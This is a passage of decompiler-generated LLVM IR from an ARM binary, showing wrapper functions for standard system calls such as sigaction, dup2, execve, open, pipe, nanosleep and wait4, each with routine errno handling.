  br i1 %tmp, label %dec_label_pc_10cf8, label %dec_label_pc_10ce8

dec_label_pc_10ce8:                               ; preds = %dec_label_pc_10cbc
  %v0_10ce8 = call i32 @function_cc08()
  %v0_10cec = load i32, i32* %r4.global-to-local, align 4
  %v1_10cec = sub i32 0, %v0_10cec
  %v2_10cf0 = inttoptr i32 %v0_10ce8 to i32*
  store i32 %v1_10cec, i32* %v2_10cf0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10cf8

dec_label_pc_10cf8:                               ; preds = %dec_label_pc_10cbc, %dec_label_pc_10ce8
  %v0_10cf8 = phi i32 [ %v0_10cdc, %dec_label_pc_10cbc ], [ -1, %dec_label_pc_10ce8 ]
  ret i32 %v0_10cf8

; uselistorder directives
  uselistorder i32 %v0_10cdc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10cf8, { 1, 0 }
}

define i32 @function_10d0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_10d0c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10d0c = load i32, i32* @r4, align 4
  store i32 %v3_10d0c, i32* %stack_var_-8, align 4
  %v1_10d10 = load i32, i32* @r1, align 4
  %v2_10d10 = inttoptr i32 %v1_10d10 to %sigaction*
  %v3_10d10 = load i32, i32* @r2, align 4
  %v4_10d10 = inttoptr i32 %v3_10d10 to %sigaction*
  %v5_10d10 = call i32 @sigaction(i32 %arg1, %sigaction* %v2_10d10, %sigaction* %v4_10d10)
  store i32 %v5_10d10, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_10d10, -4095
  br i1 %tmp, label %dec_label_pc_10d30, label %dec_label_pc_10d20

dec_label_pc_10d20:                               ; preds = %dec_label_pc_10d0c
  %v0_10d20 = call i32 @function_cc08()
  %v0_10d24 = load i32, i32* %r4.global-to-local, align 4
  %v1_10d24 = sub i32 0, %v0_10d24
  %v2_10d28 = inttoptr i32 %v0_10d20 to i32*
  store i32 %v1_10d24, i32* %v2_10d28, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10d30

dec_label_pc_10d30:                               ; preds = %dec_label_pc_10d0c, %dec_label_pc_10d20
  %v0_10d30 = phi i32 [ %v5_10d10, %dec_label_pc_10d0c ], [ -1, %dec_label_pc_10d20 ]
  %v2_10d34 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10d34, i32* %r4.global-to-local, align 4
  ret i32 %v0_10d30

; uselistorder directives
  uselistorder i32 %v5_10d10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10d30, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_10d38(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_10d38:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_10d60(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10d60:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10d60 = load i32, i32* @r4, align 4
  store i32 %v3_10d60, i32* %stack_var_-8, align 4
  %v2_10d64 = call i32 @dup2(i32 %arg1, i32 %arg2)
  store i32 %v2_10d64, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_10d64, -4095
  br i1 %tmp, label %dec_label_pc_10d84, label %dec_label_pc_10d74

dec_label_pc_10d74:                               ; preds = %dec_label_pc_10d60
  %v0_10d74 = call i32 @function_cc08()
  %v0_10d78 = load i32, i32* %r4.global-to-local, align 4
  %v1_10d78 = sub i32 0, %v0_10d78
  %v2_10d7c = inttoptr i32 %v0_10d74 to i32*
  store i32 %v1_10d78, i32* %v2_10d7c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10d84

dec_label_pc_10d84:                               ; preds = %dec_label_pc_10d60, %dec_label_pc_10d74
  %v0_10d84 = phi i32 [ %v2_10d64, %dec_label_pc_10d60 ], [ -1, %dec_label_pc_10d74 ]
  %v2_10d88 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10d88, i32* @r4, align 4
  ret i32 %v0_10d84

; uselistorder directives
  uselistorder i32 %v2_10d64, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10d84, { 1, 0 }
}

define i32 @function_10d8c() local_unnamed_addr {
dec_label_pc_10d8c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10d8c = load i32, i32* @r4, align 4
  store i32 %v3_10d8c, i32* %stack_var_-8, align 4
  %v0_10d90 = load i32, i32* @r0, align 4
  %v1_10d90 = inttoptr i32 %v0_10d90 to i8*
  %v2_10d90 = load i32, i32* @r1, align 4
  %v3_10d90 = inttoptr i32 %v2_10d90 to i8*
  %v4_10d90 = insertvalue [1 x i8*] undef, i8* %v3_10d90, 0
  %v5_10d90 = load i32, i32* @r2, align 4
  %v6_10d90 = inttoptr i32 %v5_10d90 to i8*
  %v7_10d90 = insertvalue [1 x i8*] undef, i8* %v6_10d90, 0
  %v8_10d90 = call i32 @execve(i8* %v1_10d90, [1 x i8*] %v4_10d90, [1 x i8*] %v7_10d90)
  store i32 %v8_10d90, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v8_10d90, -4095
  br i1 %tmp, label %dec_label_pc_10db0, label %dec_label_pc_10da0

dec_label_pc_10da0:                               ; preds = %dec_label_pc_10d8c
  %v0_10da0 = call i32 @function_cc08()
  %v0_10da4 = load i32, i32* %r4.global-to-local, align 4
  %v1_10da4 = sub i32 0, %v0_10da4
  %v2_10da8 = inttoptr i32 %v0_10da0 to i32*
  store i32 %v1_10da4, i32* %v2_10da8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10db0

dec_label_pc_10db0:                               ; preds = %dec_label_pc_10d8c, %dec_label_pc_10da0
  %v0_10db0 = phi i32 [ %v8_10d90, %dec_label_pc_10d8c ], [ -1, %dec_label_pc_10da0 ]
  %v2_10db4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10db4, i32* %r4.global-to-local, align 4
  ret i32 %v0_10db0

; uselistorder directives
  uselistorder i32 %v8_10d90, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10db0, { 1, 0 }
}

define i32 @function_10db8() local_unnamed_addr {
dec_label_pc_10db8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10db8 = load i32, i32* @r4, align 4
  store i32 %v3_10db8, i32* %stack_var_-8, align 4
  %v0_10dc0 = load i32, i32* @r0, align 4
  store i32 %v0_10dc0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10dc0, -4095
  br i1 %tmp, label %dec_label_pc_10ddc, label %dec_label_pc_10dcc

dec_label_pc_10dcc:                               ; preds = %dec_label_pc_10db8
  %v0_10dcc = call i32 @function_cc08()
  %v0_10dd0 = load i32, i32* %r4.global-to-local, align 4
  %v1_10dd0 = sub i32 0, %v0_10dd0
  %v2_10dd4 = inttoptr i32 %v0_10dcc to i32*
  store i32 %v1_10dd0, i32* %v2_10dd4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10de0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10ddc

dec_label_pc_10ddc:                               ; preds = %dec_label_pc_10db8, %dec_label_pc_10dcc
  %v2_10de0 = phi i32 [ %v3_10db8, %dec_label_pc_10db8 ], [ %v2_10de0.pre, %dec_label_pc_10dcc ]
  %v0_10ddc = phi i32 [ %v0_10dc0, %dec_label_pc_10db8 ], [ -1, %dec_label_pc_10dcc ]
  store i32 %v2_10de0, i32* @r4, align 4
  ret i32 %v0_10ddc

; uselistorder directives
  uselistorder i32 %v0_10dc0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10ddc, { 1, 0 }
}

define i32 @function_10de4() local_unnamed_addr {
dec_label_pc_10de4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10de4 = load i32, i32* @r4, align 4
  store i32 %v3_10de4, i32* %stack_var_-8, align 4
  %v0_10dec = load i32, i32* @r0, align 4
  store i32 %v0_10dec, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10dec, -4095
  br i1 %tmp, label %dec_label_pc_10e08, label %dec_label_pc_10df8

dec_label_pc_10df8:                               ; preds = %dec_label_pc_10de4
  %v0_10df8 = call i32 @function_cc08()
  %v0_10dfc = load i32, i32* %r4.global-to-local, align 4
  %v1_10dfc = sub i32 0, %v0_10dfc
  %v2_10e00 = inttoptr i32 %v0_10df8 to i32*
  store i32 %v1_10dfc, i32* %v2_10e00, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10e0c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10e08

dec_label_pc_10e08:                               ; preds = %dec_label_pc_10de4, %dec_label_pc_10df8
  %v2_10e0c = phi i32 [ %v3_10de4, %dec_label_pc_10de4 ], [ %v2_10e0c.pre, %dec_label_pc_10df8 ]
  %v0_10e08 = phi i32 [ %v0_10dec, %dec_label_pc_10de4 ], [ -1, %dec_label_pc_10df8 ]
  store i32 %v2_10e0c, i32* @r4, align 4
  ret i32 %v0_10e08

; uselistorder directives
  uselistorder i32 %v0_10dec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10e08, { 1, 0 }
}

define i32 @function_10e10(i32 %arg1) local_unnamed_addr {
dec_label_pc_10e10:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10e10 = load i32, i32* @r4, align 4
  store i32 %v3_10e10, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10e34, label %dec_label_pc_10e24

dec_label_pc_10e24:                               ; preds = %dec_label_pc_10e10
  %v0_10e24 = call i32 @function_cc08()
  %v0_10e28 = load i32, i32* %r4.global-to-local, align 4
  %v1_10e28 = sub i32 0, %v0_10e28
  %v2_10e2c = inttoptr i32 %v0_10e24 to i32*
  store i32 %v1_10e28, i32* %v2_10e2c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10e38.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10e34

dec_label_pc_10e34:                               ; preds = %dec_label_pc_10e10, %dec_label_pc_10e24
  %v2_10e38 = phi i32 [ %v3_10e10, %dec_label_pc_10e10 ], [ %v2_10e38.pre, %dec_label_pc_10e24 ]
  %v0_10e34 = phi i32 [ %arg1, %dec_label_pc_10e10 ], [ -1, %dec_label_pc_10e24 ]
  store i32 %v2_10e38, i32* %r4.global-to-local, align 4
  ret i32 %v0_10e34

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10e34, { 1, 0 }
}

define i32 @function_10e3c() local_unnamed_addr {
dec_label_pc_10e3c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10e3c = load i32, i32* @r4, align 4
  store i32 %v3_10e3c, i32* %stack_var_-8, align 4
  %v0_10e44 = load i32, i32* @r0, align 4
  store i32 %v0_10e44, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10e44, -4095
  br i1 %tmp, label %dec_label_pc_10e60, label %dec_label_pc_10e50

dec_label_pc_10e50:                               ; preds = %dec_label_pc_10e3c
  %v0_10e50 = call i32 @function_cc08()
  %v0_10e54 = load i32, i32* %r4.global-to-local, align 4
  %v1_10e54 = sub i32 0, %v0_10e54
  %v2_10e58 = inttoptr i32 %v0_10e50 to i32*
  store i32 %v1_10e54, i32* %v2_10e58, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10e64.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10e60

dec_label_pc_10e60:                               ; preds = %dec_label_pc_10e3c, %dec_label_pc_10e50
  %v2_10e64 = phi i32 [ %v3_10e3c, %dec_label_pc_10e3c ], [ %v2_10e64.pre, %dec_label_pc_10e50 ]
  %v0_10e60 = phi i32 [ %v0_10e44, %dec_label_pc_10e3c ], [ -1, %dec_label_pc_10e50 ]
  store i32 %v2_10e64, i32* %r4.global-to-local, align 4
  ret i32 %v0_10e60

; uselistorder directives
  uselistorder i32 %v0_10e44, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10e60, { 1, 0 }
}

define i32 @function_10e68(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10e68:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_10e68 = load i32, i32* @r4, align 4
  store i32 %v3_10e68, i32* %stack_var_-8, align 4
  %v6_10e6c = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_10e6c, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_10e6c, -4095
  br i1 %tmp6, label %dec_label_pc_10e8c, label %dec_label_pc_10e7c

dec_label_pc_10e7c:                               ; preds = %dec_label_pc_10e68
  %v0_10e7c = call i32 @function_cc08()
  %v0_10e80 = load i32, i32* %r4.global-to-local, align 4
  %v1_10e80 = sub i32 0, %v0_10e80
  %v2_10e84 = inttoptr i32 %v0_10e7c to i32*
  store i32 %v1_10e80, i32* %v2_10e84, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10e8c

dec_label_pc_10e8c:                               ; preds = %dec_label_pc_10e68, %dec_label_pc_10e7c
  %v0_10e8c = phi i32 [ %v6_10e6c, %dec_label_pc_10e68 ], [ -1, %dec_label_pc_10e7c ]
  %v2_10e90 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10e90, i32* %r4.global-to-local, align 4
  ret i32 %v0_10e8c

; uselistorder directives
  uselistorder i32 %v6_10e6c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10e8c, { 1, 0 }
}

define i32 @function_10e94(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10e94:
  %r4.global-to-local = alloca i32, align 4
  %v1_10ea4 = and i32 %arg2, 64
  %v2_10ea4 = icmp eq i32 %v1_10ea4, 0
  br i1 %v2_10ea4, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_10e94
  %v6_10e94 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_10e94, 65536
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10e94, %bb
  %v0_10eb4 = phi i32 [ 0, %dec_label_pc_10e94 ], [ %phitmp, %bb ]
  store i32 %v0_10eb4, i32* @r2, align 4
  %v4_10ebc = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_10ec0 = icmp eq i32 %v4_10ebc, -4096
  store i1 %v7_10ec0, i1* @cpsr_z, align 1
  store i32 %v4_10ebc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_10ebc, -4095
  br i1 %tmp, label %dec_label_pc_10edc, label %dec_label_pc_10ecc

dec_label_pc_10ecc:                               ; preds = %.thread1
  %v0_10ecc = call i32 @function_cc08()
  %v0_10ed0 = load i32, i32* %r4.global-to-local, align 4
  %v1_10ed0 = sub i32 0, %v0_10ed0
  %v2_10ed4 = inttoptr i32 %v0_10ecc to i32*
  store i32 %v1_10ed0, i32* %v2_10ed4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10edc

dec_label_pc_10edc:                               ; preds = %.thread1, %dec_label_pc_10ecc
  %v0_10edc = phi i32 [ %v4_10ebc, %.thread1 ], [ -1, %dec_label_pc_10ecc ]
  ret i32 %v0_10edc

; uselistorder directives
  uselistorder i32 %v4_10ebc, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10edc, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_10ef0(i32 %arg1) local_unnamed_addr {
dec_label_pc_10ef0:
  store i32 %arg1, i32* @r2, align 4
  %v0_10ef8 = load i32, i32* @r0, align 4
  %v2_10ef8 = inttoptr i32 %v0_10ef8 to i8*
  %v3_10ef8 = call i32 @function_10e94(i8* %v2_10ef8, i32 577)
  %v0_10efc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10efc, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_10ef0
  %v6_10efc = and i32 %v3_10ef8, 36
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_10ef0, %bb
  %v7_10efc = phi i32 [ %v3_10ef8, %dec_label_pc_10ef0 ], [ %v6_10efc, %bb ]
  ret i32 %v7_10efc

; uselistorder directives
  uselistorder i32 (i8*, i32)* @function_10e94, { 0, 2, 1 }
  uselistorder i32 577, { 1, 0, 2 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_10f00(i32 %arg1) local_unnamed_addr {
dec_label_pc_10f00:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10f00 = load i32, i32* @r4, align 4
  store i32 %v3_10f00, i32* %stack_var_-8, align 4
  %v1_10f04 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_10f04 = call i32 @pipe([2 x i32] %v1_10f04)
  store i32 %v2_10f04, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_10f04, -4095
  br i1 %tmp, label %dec_label_pc_10f24, label %dec_label_pc_10f14

dec_label_pc_10f14:                               ; preds = %dec_label_pc_10f00
  %v0_10f14 = call i32 @function_cc08()
  %v0_10f18 = load i32, i32* %r4.global-to-local, align 4
  %v1_10f18 = sub i32 0, %v0_10f18
  %v2_10f1c = inttoptr i32 %v0_10f14 to i32*
  store i32 %v1_10f18, i32* %v2_10f1c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10f24

dec_label_pc_10f24:                               ; preds = %dec_label_pc_10f00, %dec_label_pc_10f14
  %v0_10f24 = phi i32 [ %v2_10f04, %dec_label_pc_10f00 ], [ -1, %dec_label_pc_10f14 ]
  %v2_10f28 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10f28, i32* @r4, align 4
  ret i32 %v0_10f24

; uselistorder directives
  uselistorder i32 %v2_10f04, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10f24, { 1, 0 }
}

define i32 @function_10f2c(i32 %arg1) local_unnamed_addr {
dec_label_pc_10f2c:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10f2c = load i32, i32* @r4, align 4
  store i32 %v3_10f2c, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_21b64.525 to i32), i32* %r4.global-to-local, align 4
  %v2_10f34 = load i32, i32* @global_var_21b64.525, align 4
  %v2_10f38 = icmp eq i32 %v2_10f34, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_10f38, label %dec_label_pc_10f48, label %dec_label_pc_10f54

dec_label_pc_10f48:                               ; preds = %dec_label_pc_10f2c
  %v2_10f48 = call i32 @function_1323c(i32* null)
  %v1_10f4c = icmp slt i32 %v2_10f48, 0
  br i1 %v1_10f4c, label %dec_label_pc_10f74, label %dec_label_pc_10f54thread-pre-split

dec_label_pc_10f54thread-pre-split:               ; preds = %dec_label_pc_10f48
  %v0_10f58.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_10f54.pre = load i32, i32* @global_var_21b64.525, align 4
  br label %dec_label_pc_10f54

dec_label_pc_10f54:                               ; preds = %dec_label_pc_10f54thread-pre-split, %dec_label_pc_10f2c
  %v2_10f54 = phi i32 [ %v2_10f54.pre, %dec_label_pc_10f54thread-pre-split ], [ %v2_10f34, %dec_label_pc_10f2c ]
  %v1_10f60 = phi i32 [ %v0_10f58.pr, %dec_label_pc_10f54thread-pre-split ], [ %arg1, %dec_label_pc_10f2c ]
  %v2_10f58 = icmp eq i32 %v1_10f60, 0
  store i32 %v2_10f54, i32* %r4.global-to-local, align 4
  br i1 %v2_10f58, label %dec_label_pc_10f78, label %dec_label_pc_10f68

dec_label_pc_10f68:                               ; preds = %dec_label_pc_10f54
  %v2_10f60 = add i32 %v1_10f60, %v2_10f54
  %v1_10f68 = inttoptr i32 %v2_10f60 to i32*
  %v2_10f68 = call i32 @function_1323c(i32* %v1_10f68)
  %v1_10f6c = icmp slt i32 %v2_10f68, 0
  br i1 %v1_10f6c, label %dec_label_pc_10f74, label %dec_label_pc_10f68.dec_label_pc_10f78_crit_edge

dec_label_pc_10f68.dec_label_pc_10f78_crit_edge:  ; preds = %dec_label_pc_10f68
  %v0_10f78.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10f78

dec_label_pc_10f74:                               ; preds = %dec_label_pc_10f68, %dec_label_pc_10f48
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10f78

dec_label_pc_10f78:                               ; preds = %dec_label_pc_10f68.dec_label_pc_10f78_crit_edge, %dec_label_pc_10f54, %dec_label_pc_10f74
  %v0_10f78 = phi i32 [ %v0_10f78.pre, %dec_label_pc_10f68.dec_label_pc_10f78_crit_edge ], [ %v2_10f54, %dec_label_pc_10f54 ], [ -1, %dec_label_pc_10f74 ]
  %v2_10f7c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10f7c, i32* @r4, align 4
  ret i32 %v0_10f78

; uselistorder directives
  uselistorder i32 %v2_10f54, { 1, 0, 2 }
  uselistorder i32* null, { 0, 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder label %dec_label_pc_10f78, { 2, 0, 1 }
}

define i32 @function_10f84(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10f84:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10f84 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_10f84, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_10f84
  %v3_10f8c5 = load i32, i32* @r4, align 4
  store i32 %v3_10f8c5, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10fac

bb:                                               ; preds = %dec_label_pc_10f84
  %v3_10f8c = load i32, i32* @r4, align 4
  store i32 %v3_10f8c, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_10fac, label %dec_label_pc_10f98

dec_label_pc_10f98:                               ; preds = %bb
  %v0_10f98 = call i32 @function_cc08()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10fa4 = inttoptr i32 %v0_10f98 to i32*
  store i32 22, i32* %v2_10fa4, align 4
  %v0_10fd0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10fd0

dec_label_pc_10fac:                               ; preds = %.thread, %bb
  %v7_10fac = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_10fac, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_10fac, -4095
  br i1 %tmp13, label %dec_label_pc_10fcc, label %dec_label_pc_10fbc

dec_label_pc_10fbc:                               ; preds = %dec_label_pc_10fac
  %v0_10fbc = call i32 @function_cc08()
  %v0_10fc0 = load i32, i32* %r4.global-to-local, align 4
  %v1_10fc0 = sub i32 0, %v0_10fc0
  %v2_10fc4 = inttoptr i32 %v0_10fbc to i32*
  store i32 %v1_10fc0, i32* %v2_10fc4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10fcc

dec_label_pc_10fcc:                               ; preds = %dec_label_pc_10fac, %dec_label_pc_10fbc
  %v0_10fcc = phi i32 [ %v7_10fac, %dec_label_pc_10fac ], [ -1, %dec_label_pc_10fbc ]
  store i32 %v0_10fcc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10fd0

dec_label_pc_10fd0:                               ; preds = %dec_label_pc_10f98, %dec_label_pc_10fcc
  %v0_10fd0 = phi i32 [ %v0_10fd0.pre, %dec_label_pc_10f98 ], [ %v0_10fcc, %dec_label_pc_10fcc ]
  %v2_10fd4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10fd4, i32* @r4, align 4
  ret i32 %v0_10fd0

; uselistorder directives
  uselistorder i32 %v7_10fac, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10fd0, { 1, 0 }
  uselistorder label %dec_label_pc_10fcc, { 1, 0 }
  uselistorder label %dec_label_pc_10fac, { 1, 0 }
}

define i32 @function_10fd8() local_unnamed_addr {
dec_label_pc_10fd8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10fd8 = load i32, i32* @r4, align 4
  store i32 %v3_10fd8, i32* %stack_var_-8, align 4
  %v0_10fdc = load i32, i32* @r0, align 4
  %v1_10fdc = load i32, i32* @r1, align 4
  %v2_10fdc = load i32, i32* @r2, align 4
  %v3_10fdc = load i32, i32* @r3, align 4
  %v4_10fdc = inttoptr i32 %v3_10fdc to %rusage*
  %v5_10fdc = call i32 @wait4(i32 %v0_10fdc, i32 %v1_10fdc, i32 %v2_10fdc, %rusage* %v4_10fdc)
  store i32 %v5_10fdc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_10fdc, -4095
  br i1 %tmp, label %dec_label_pc_10ffc, label %dec_label_pc_10fec

dec_label_pc_10fec:                               ; preds = %dec_label_pc_10fd8
  %v0_10fec = call i32 @function_cc08()
  %v0_10ff0 = load i32, i32* %r4.global-to-local, align 4
  %v1_10ff0 = sub i32 0, %v0_10ff0
  %v2_10ff4 = inttoptr i32 %v0_10fec to i32*
  store i32 %v1_10ff0, i32* %v2_10ff4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10ffc

dec_label_pc_10ffc:                               ; preds = %dec_label_pc_10fd8, %dec_label_pc_10fec
  %v0_10ffc = phi i32 [ %v5_10fdc, %dec_label_pc_10fd8 ], [ -1, %dec_label_pc_10fec ]
  %v2_11000 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11000, i32* @r4, align 4
  ret i32 %v0_10ffc

; uselistorder directives
  uselistorder i32 %v5_10fdc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10ffc, { 1, 0 }
}

define i32 @function_11004() local_unnamed_addr {
dec_label_pc_11004:
  ret i32 ptrtoint (i32* @global_var_21b44.527 to i32)
}

define i32 @function_11010(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11010:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_11014 = icmp eq i32 %arg1, 0
  br i1 %v2_11014, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_11010
  br label %bb11

bb:                                               ; preds = %dec_label_pc_11010
  %v3_1101c = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_11044 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_11038 = phi i32 [ %arg1, %.thread ], [ %v3_1101c, %bb ]
  store i32 %arg3, i32* @r4, align 4
  store i32 16, i32* @r3, align 4
  %v2_11030 = ptrtoint i32* %stack_var_-16 to i32
  %v2_1103c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_1103c, i32* %stack_var_-16, align 4
  store i32 %v0_11044, i32* %stack_var_-12, align 4
  %v5_1104c = inttoptr i32 %v0_11038 to i8*
  %v6_1104c = call i32 @function_11080(i8* %v5_1104c, i32 %v2_11030, i32 1, i32 16, i32 %arg3)
  %v2_11050 = icmp eq i32 %v6_1104c, 0
  br i1 %v2_11050, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v8_1105c = phi i32 [ %v6_1104c, %bb11 ], [ 1, %bb12 ]
  ret i32 %v8_1105c

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_11060() local_unnamed_addr {
dec_label_pc_11060:
  %v0_1106c = load i32, i32* @r2, align 4
  store i32 %v0_1106c, i32* @r3, align 4
  %v0_11074 = load i32, i32* @r0, align 4
  %v1_11074 = load i32, i32* @r1, align 4
  %v5_11074 = inttoptr i32 %v0_11074 to i8*
  %v6_11074 = call i32 @function_11080(i8* %v5_11074, i32 %v1_11074, i32 -1, i32 %v0_1106c, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_11074
}

define i32 @function_11080(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_11080:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11080 = load i32, i32* @r4, align 4
